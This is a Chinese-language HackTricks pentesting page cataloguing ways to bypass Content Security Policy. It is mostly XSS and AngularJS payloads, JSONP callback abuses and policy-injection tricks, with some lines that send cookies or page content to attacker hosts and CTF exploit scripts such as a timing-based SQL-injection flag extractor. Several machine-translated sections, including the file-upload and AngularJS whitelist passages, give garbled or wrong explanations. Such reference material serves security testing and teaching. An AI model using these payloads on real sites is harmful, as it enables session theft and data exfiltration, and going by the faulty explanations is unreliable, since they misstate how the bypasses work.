# 内容安全策略（CSP）绕过

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**无需等待即可获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声望积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行为中获利！

{% embed url="https://hackenproof.com/register" %}

## 什么是CSP

内容安全策略（Content Security Policy，CSP）是一种内置的浏览器技术，**有助于防止跨站脚本（XSS）等攻击**。它列出并描述了浏览器可以安全加载资源的路径和来源。这些资源可以包括图像、框架、JavaScript等。以下是允许从本地域（self）加载和执行内联资源以及允许字符串代码执行函数（如`eval`、`setTimeout`或`setInterval`）的示例：

内容安全策略通过**响应头**或**HTML页面的元素**实现。浏览器遵循接收到的策略，并在检测到违规时主动阻止。

通过响应头实现：
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
通过 meta 标签实现：
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

* `Content-Security-Policy`（内容安全策略）
* `Content-Security-Policy-Report-Only`（仅报告模式，不会阻止任何内容，仅发送报告，用于预发布环境）。

## 定义资源

CSP通过限制可以加载主动和被动内容的来源来工作。它还可以限制主动内容的某些方面，例如执行内联JavaScript和使用`eval()`函数。
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### 指令

* **script-src**: 此指令指定了允许的 JavaScript 资源来源。这不仅包括直接加载到元素中的 URL，还包括可以触发脚本执行的内联脚本事件处理程序（例如 onclick）和 XSLT 样式表。
* **default-src**: 此指令定义了默认情况下获取资源的策略。当 CSP 标头中缺少获取指令时，浏览器默认遵循此指令。
* **Child-src**: 此指令定义了 Web Workers 和嵌入式框架内容的允许资源。
* **connect-src**: 此指令限制了使用 fetch、websocket、XMLHttpRequest 等接口加载的 URL。
* **frame-src**: 此指令限制了可以调用的框架的 URL。
* **frame-ancestors**: 此指令指定可以嵌入当前页面的来源。此指令适用于 [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)、[`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)、[`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)、[`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed) 或 [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet)。此指令不能在标签中使用，仅适用于非 HTML 资源。
* **img-src**: 它定义了可以加载网页上的图像的来源。
* **font-src:** 指令指定了使用 `@font-face` 加载字体的有效来源。
* **manifest-src**: 此指令定义了应用程序清单文件的允许来源。
* **media-src**: 它定义了可以加载媒体对象的来源。
* **object-src**: 它定义了 `<object>`、`<embed>` 和 `<applet>` 元素的允许来源。
* **base-uri**: 它定义了可以使用元素加载的 URL。
* **form-action**: 此指令列出了标签提交的有效端点。
* **plugin-types**: 它定义了页面可以调用的 MIME 类型的限制。
* **upgrade-insecure-requests**: 此指令指示浏览器重写 URL 方案，将 HTTP 改为 HTTPS。对于需要重写大量旧 URL 的网站，此指令可能很有用。
* **sandbox**: sandbox 指令为请求的资源启用了类似于 sandbox 属性的沙箱。它对页面的操作施加了限制，包括阻止弹出窗口、阻止插件和脚本的执行，并强制执行同源策略。

### **来源**

* \*: 这允许任何 URL，但不包括 `data:`、`blob:`、`filesystem:` 方案。
* **self**: 此来源定义了允许从同一域加载页面上的资源。
* **data**: 此来源允许通过 data 方案加载资源（例如 Base64 编码的图像）。
* **none**: 此指令不允许从任何来源加载任何内容。
* **unsafe-eval**: 这允许使用 eval() 和类似的方法从字符串创建代码。出于安全原因，不建议在任何指令中包含此来源。因此，它被命名为 unsafe。
* **unsafe-hashes**: 这允许启用特定的内联事件处理程序。
* **unsafe-inline**: 这允许使用内联资源，例如内联元素、javascript: URL、内联事件处理程序和内联元素。出于安全原因，不建议使用此功能。
* **nonce**: 使用加密的 nonce（一次性数字）为特定的内联脚本设置白名单。服务器必须每次传输策略时生成唯一的 nonce 值。
* **sha256-\<hash>**: 为具有特定 sha256 哈希的脚本设置白名单
* **strict-dynamic**: 它允许浏览器从先前由 "nonce" 或 "hash" 值列入白名单的任何脚本来源中加载和执行新的 JavaScript 标签。
* **host**: 指示主机，例如 example.com

## 不安全的 CSP 规则

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
工作负载：`"/><script>alert(1);</script>`

#### 通过 iframe 实现 self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
有效的负载：
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

如果你能以某种方式使一个**允许的JS代码创建一个新的脚本标签**在DOM中，因为是一个允许的脚本创建了它，**新的脚本标签将被允许执行**。

### 通配符 (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
有效的负载：
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### 缺乏 object-src 和 default-src

{% hint style="danger" %}
**看起来这个方法已经不再有效**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
有效的负载：
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### 文件上传 + 'self'

#### 介绍

在Web应用程序中，内容安全策略（Content Security Policy，CSP）是一种安全机制，用于限制浏览器加载和执行的内容。CSP通过指定允许加载的资源源来减少跨站点脚本攻击（XSS）和数据泄露等安全风险。

然而，有时候我们可能需要绕过CSP限制，以便上传恶意文件或执行未经授权的操作。本文将介绍一种绕过CSP限制的技术，即利用文件上传功能和CSP策略中的'self'关键字。

#### 攻击步骤

1. 首先，我们需要找到一个允许文件上传的功能点。这可以是一个用户头像上传、文件分享或其他允许用户上传文件的功能。

2. 接下来，我们需要构造一个恶意文件，该文件包含我们想要执行的恶意代码。这可以是一个包含JavaScript代码的HTML文件，或者是一个包含恶意代码的图片文件。

3. 在构造恶意文件时，我们需要注意以下几点：
   - 文件扩展名：为了绕过CSP限制，我们可以使用一些常见的文件扩展名，如.jpg、.png或.gif。这样，服务器可能会将文件类型识别为图片，而不会对其进行进一步的检查。
   - 文件内容：我们需要在文件中插入恶意代码，以便在被加载时执行。这可以是一段JavaScript代码，用于执行XSS攻击或其他恶意操作。

4. 在上传文件时，我们需要将文件的Content-Type设置为'image/*'，以便绕过CSP策略中的'self'关键字。这样，浏览器将会认为该文件是一个图片文件，而不会对其进行CSP限制。

5. 一旦文件上传成功并被服务器接受，我们可以通过访问该文件的URL来执行恶意代码。由于该文件被服务器识别为图片文件，浏览器将会加载并执行其中的JavaScript代码，从而绕过CSP限制。

#### 防御方法

要防止文件上传 + 'self'攻击，可以采取以下措施：

1. 对用户上传的文件进行严格的文件类型检查和验证，确保只允许上传安全的文件类型。

2. 在CSP策略中，不要使用'self'关键字来允许加载所有来自同一域名的资源。而是应该明确指定允许加载的资源源，以减少安全风险。

3. 对上传的文件进行内容检查，确保其中不包含恶意代码。

4. 定期更新和维护Web应用程序的安全机制，以及及时修复已知的安全漏洞。

#### 结论

文件上传 + 'self'攻击是一种绕过CSP限制的技术，可以用于上传恶意文件或执行未经授权的操作。为了防止此类攻击，应该对用户上传的文件进行严格的验证和检查，并采取适当的安全措施来减少安全风险。
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
如果你能上传一个JS文件，你就可以绕过这个CSP：

有效载荷：
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
然而，很有可能服务器正在**验证上传的文件**，并且只允许你**上传特定类型的文件**。

此外，即使你能够通过使用服务器接受的扩展名（如_script.png）在文件中上传**JS代码**，这还不够，因为一些服务器（如Apache服务器）会根据扩展名**选择文件的MIME类型**，而像Chrome这样的浏览器会**拒绝执行应该是图像的东西中的Javascript代码**。"幸运的是"，这里存在一些错误。例如，从一个CTF中我学到，**Apache不知道**.wave扩展名，因此它不会使用类似audio/\*的**MIME类型**提供它。

从这里开始，如果你找到了一个XSS漏洞和一个文件上传漏洞，并且你设法找到了一个**被错误解释的扩展名**，你可以尝试上传一个带有该扩展名和脚本内容的文件。或者，如果服务器正在检查上传文件的正确格式，你可以创建一个多语言文件（[这里有一些多语言文件的例子](https://github.com/Polydet/polyglot-database)）。

### 第三方终端点 + ('unsafe-eval')

{% hint style="warning" %}
对于以下一些有效载荷，**`unsafe-eval`甚至都不需要**。
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
加载一个有漏洞的Angular版本并执行任意JS代码：
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### 使用Angular + 一个返回`window`对象的函数库的有效载荷（[查看此文章](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)）：

{% hint style="info" %}
该文章显示您可以从`cdn.cloudflare.com`（或任何其他允许的JS库仓库）**加载**所有**库**，执行每个库中添加的所有函数，并检查**哪些函数从哪些库返回`window`对象**。
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### 滥用谷歌验证码JS代码

根据[**这篇CTF解题报告**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)，您可以滥用[https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)在CSP中执行任意JS代码，绕过CSP限制：
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### 第三方端点 + JSONP

JSONP（JSON with Padding）是一种绕过内容安全策略（CSP）限制的技术。CSP是一种安全机制，用于防止跨站点脚本攻击（XSS）和其他恶意行为。然而，通过使用JSONP，攻击者可以绕过CSP限制并执行恶意代码。

JSONP利用了浏览器对`<script>`标签的信任，允许从不同域的服务器加载脚本。攻击者可以将恶意代码嵌入到JSONP响应中，并通过动态创建`<script>`标签来执行该代码。

要利用JSONP绕过CSP，攻击者需要找到一个允许使用JSONP的第三方端点。这个端点应该接受一个回调函数作为参数，并将恶意代码作为回调函数的参数返回。

以下是一个示例，演示了如何使用JSONP绕过CSP限制：

```html
<script>
  function handleResponse(data) {
    // 在这里执行恶意代码
  }
</script>

<script src="https://third-party.com/endpoint?callback=handleResponse"></script>
```

在上面的示例中，`handleResponse`函数将作为回调函数传递给第三方端点。该端点将返回一个包含恶意代码的响应，并将其作为参数传递给回调函数。这样，恶意代码将在浏览器中执行，绕过了CSP限制。

需要注意的是，JSONP存在安全风险，并且已经被许多现代浏览器禁用。因此，作为安全专业人员，我们应该避免使用JSONP，并使用更安全的替代方案来保护应用程序免受攻击。
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
像这样的情况，`script-src`被设置为`self`和一个特定的域名，该域名被列入白名单，可以通过使用JSONP来绕过。JSONP端点允许使用不安全的回调方法，这使得攻击者可以执行XSS攻击，有效载荷如下：

```html
<script src="https://attacker.com/evil.js"></script>
```

攻击者可以创建一个恶意的JavaScript文件（`evil.js`），并将其作为脚本源（`src`）注入到受影响的网页中。这样，攻击者就可以在用户浏览器中执行任意的恶意代码。
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **包含了用于绕过不同网站的CSP的JSONP端点。**

如果**受信任的端点包含一个开放重定向**，那么将会出现相同的漏洞，因为如果初始端点是受信任的，那么重定向也是受信任的。

### 文件夹路径绕过

如果CSP策略指向一个文件夹，并且你使用**%2f**来编码**"/"**，它仍然被认为是在文件夹内部。所有浏览器似乎都同意这一点。\
这导致了一个可能的绕过方式，通过使用"**%2f..%2f**"，如果服务器解码它的话。例如，如果CSP允许`http://example.com/company/`，你可以绕过文件夹限制并执行：`http://example.com/company%2f..%2fattacker/file.js`

在线示例：[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS执行

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### 缺少**base-uri**

如果缺少**base-uri**指令，你可以滥用它来执行[**悬挂标记注入**](../dangling-markup-html-scriptless-injection/)。

此外，如果页面使用相对路径（如`/js/app.js`）加载脚本，并使用**Nonce**，你可以滥用**base** **tag**来使其从**你自己的服务器加载**脚本，从而实现XSS。\
如果易受攻击的页面使用**httpS**加载，请使用一个httpS的URL。
```html
<base href="https://www.attacker.com/">
```
### AngularJS 事件

根据具体的策略，CSP会阻止JavaScript事件。然而，AngularJS定义了自己的事件，可以代替使用。当在事件内部时，AngularJS定义了一个特殊的`$event`对象，它简单地引用浏览器事件对象。您可以使用此对象来执行CSP绕过。在Chrome上，`$event/event`对象上有一个特殊的属性叫做`path`。该属性包含一个对象数组，导致事件被执行。最后一个属性始终是`window`对象，我们可以使用它来执行沙盒逃逸。通过将此数组传递给`orderBy`过滤器，我们可以枚举数组并使用最后一个元素（`window`对象）来执行全局函数，例如`alert()`。以下代码演示了这一点：
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**在** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **中查找其他Angular绕过方法**

### AngularJS和白名单域名

```html
<iframe src="https://www.youtube.com/embed/abcdefghijk" ng-src="{{trustedUrl}}"></iframe>
```

This bypasses the AngularJS `ng-src` directive by using a hardcoded URL in the `src` attribute and the AngularJS expression `{{trustedUrl}}` in the `ng-src` attribute. The `trustedUrl` variable is expected to be a trusted URL that has been whitelisted by the application.

这种方法通过在`src`属性中使用硬编码的URL和在`ng-src`属性中使用AngularJS表达式`{{trustedUrl}}`来绕过AngularJS的`ng-src`指令。`trustedUrl`变量应该是应用程序已经将其列入白名单的可信任URL。

```html
<img src="https://www.example.com/image.jpg" ng-src="{{trustedUrl}}">
```

This bypasses the AngularJS `ng-src` directive by using a hardcoded URL in the `src` attribute and the AngularJS expression `{{trustedUrl}}` in the `ng-src` attribute. The `trustedUrl` variable is expected to be a trusted URL that has been whitelisted by the application.

这种方法通过在`src`属性中使用硬编码的URL和在`ng-src`属性中使用AngularJS表达式`{{trustedUrl}}`来绕过AngularJS的`ng-src`指令。`trustedUrl`变量应该是应用程序已经将其列入白名单的可信任URL。
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
如果应用程序使用Angular JS，并且脚本是从白名单域加载的，那么可以通过调用回调函数和易受攻击的类来绕过此CSP策略。有关更多详细信息，请访问这个很棒的[git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)存储库。

有效载荷示例：
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
其他JSONP任意执行端点可以在[**这里**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)找到（其中一些已被删除或修复）。

### 使用悬挂标记绕过CSP

请阅读[此处](../dangling-markup-html-scriptless-injection/)了解详情。

### 'unsafe-inline'; img-src \*; 通过XSS绕过CSP
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` 表示可以在代码中执行任何脚本（XSS 可以执行代码），`img-src *` 表示可以在网页中使用来自任何资源的任何图像。

您可以通过图像将数据泄露来绕过此 CSP（在此情况下，XSS 滥用了 CSRF，其中机器人可以访问的页面包含 SQLi，并通过图像提取标志）：
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
从：[https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

您还可以滥用此配置来**加载插入图像中的JavaScript代码**。例如，如果页面允许从Twitter加载图像，您可以**制作**一个**特殊的图像**，将其**上传**到Twitter，并滥用“**unsafe-inline**”来执行JS代码（作为常规的XSS），该代码将**加载**图像，从中**提取**JS并**执行**它：[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### 使用Service Workers

Service Workers的**`importScripts`**函数不受CSP限制：

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### 策略注入

**研究：**[**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

如果您发送的**参数**被**粘贴到**策略的**声明**中，那么您可以以某种方式**更改**策略，使其变得**无效**。您可以使用以下任何一种绕过方法来**允许脚本 'unsafe-inline'**：
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
因为这个指令会**覆盖现有的script-src指令**。\
你可以在这里找到一个例子：[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

在Edge中，这更简单。如果你可以在CSP中添加这个：**`;_`**，**Edge**会**丢弃**整个**策略**。\
例子：[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; 通过XSS（iframe）进行时间攻击

注意缺少指令`'unsafe-inline'`\
这次你可以通过**XSS**使受害者在**你的控制下**加载一个页面，使用`<iframe`。这次你将让受害者访问你想要提取信息（**CSRF**）的页面。你无法访问页面的内容，但如果你可以**控制页面加载所需的时间**，你就可以提取所需的信息。

这次将提取一个**标志**，每当通过SQLi**正确猜测一个字符**时，由于休眠函数，**响应时间**会变长。然后，你将能够提取标志：
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### 通过书签工具

这种攻击需要一些社交工程，攻击者会**说服用户将链接拖放到浏览器的书签工具上**。这个书签工具会包含**恶意的 JavaScript 代码**，当被拖放或点击时，会在当前网页窗口的上下文中执行，**绕过 CSP 并允许窃取敏感信息**，如 cookies 或令牌。

了解更多信息，请[**查看原始报告**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)。

### 通过限制 CSP 绕过

在[**这个 CTF 解答**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)中，通过在允许的 iframe 中注入一个更严格的 CSP，禁止加载特定的 JS 文件，然后通过**原型污染**或**DOM 篡改**来滥用不同的脚本来加载任意脚本，从而绕过了 CSP。

您可以使用**`csp`**属性**限制 iframe 的 CSP**：

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

在[**这个CTF解答**](https://github.com/aszx87410/ctf-writeups/issues/48)中，通过**HTML注入**可以更加**限制**CSP，从而禁用了防止CSTI的脚本，因此**漏洞变得可利用**。\
可以使用**HTML元标签**使CSP更加严格，并通过**删除**允许其**nonce**的**入口**和**通过sha启用特定的内联脚本**来禁用内联脚本：
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### 使用 Content-Security-Policy-Report-Only 进行 JS 数据泄露

如果你能够让服务器响应头中的 **`Content-Security-Policy-Report-Only`** 的值由你控制（可能是因为 CRLF 漏洞），你可以让它指向你的服务器，并且如果你用 **`<script>`** 包裹你想要泄露的 JS 内容，由于 CSP 很可能不允许 `unsafe-inline`，这将触发 CSP 错误，并且包含敏感信息的脚本的一部分将从 `Content-Security-Policy-Report-Only` 发送到服务器。

例如，可以参考[**这个 CTF 解题报告**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)。

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### 泄露信息的CSP + iframe

想象一种情况，一个页面根据用户不同，将重定向到一个带有秘密的不同页面。例如，用户admin访问redirectme.domain1.com会被重定向到adminsecret321.domain2.com，你可以对admin进行XSS攻击。同时，被重定向的页面不被安全策略允许，但是进行重定向的页面是允许的。

你可以通过以下方式泄露admin被重定向的域名：

* 通过CSP违规
* 通过CSP规则

CSP违规是一种即时泄露。只需要加载一个指向`https://redirectme.domain1.com`的iframe，并监听`securitypolicyviolation`事件，该事件包含`blockedURI`属性，其中包含被阻止的URI的域名。这是因为`https://redirectme.domain1.com`（CSP允许）重定向到`https://adminsecret321.domain2.com`（CSP阻止）。这利用了CSP处理iframes的未定义行为。Chrome和Firefox在这方面的行为不同。

当你知道可能组成秘密子域名的字符时，你还可以使用二分搜索，并检查CSP何时阻止资源何时不阻止资源，从而在CSP中创建不同的禁止域名（在这种情况下，秘密可能以doc-X-XXXX.secdrivencontent.dev的形式存在）。
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
从[**这里**](https://ctftime.org/writeup/29310)的技巧。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
只有在客户存入奖励预算后，HackenProof才会启动赏金。在漏洞验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的时代掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

## 绕过CSP的不安全技术

### PHP响应缓冲区超载

PHP默认情况下会将响应缓冲区设置为4096字节。因此，如果PHP显示警告，通过在警告中提供足够的数据，响应将在CSP头之前发送，导致头被忽略。\
然后，该技术基本上是通过使用警告填充响应缓冲区，以便不发送CSP头。

从[**这篇文章**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)中得到的想法。

### 重写错误页面

